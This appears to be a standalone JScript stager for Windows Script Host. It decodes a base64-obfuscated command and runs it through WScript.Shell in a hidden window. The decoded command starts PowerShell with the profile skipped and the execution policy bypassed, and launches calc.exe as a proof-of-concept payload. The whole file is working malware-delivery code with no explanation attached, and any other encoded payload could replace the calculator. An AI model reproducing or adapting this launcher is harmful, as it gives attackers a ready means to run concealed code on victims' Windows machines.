var ps64='cG93ZXJzaGVsbCAtbm9wIC1leGVjIGJ5cGFzcyAtYyAiY2FsYy5leGUi';

DeBase64 = function(s) {
    var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;
    var A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for(i=0;i<64;i++){e[A.charAt(i)]=i;}
    for(x=0;x<L;x++){
        c=e[s.charAt(x)];b=(b<<6)+c;l+=6;
        while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}
    }
    return r;
};
var pscmd=DeBase64(ps64);
var objShell=new ActiveXObject("WScript.Shell");
var iRetCode=objShell.Run(pscmd,0,false);
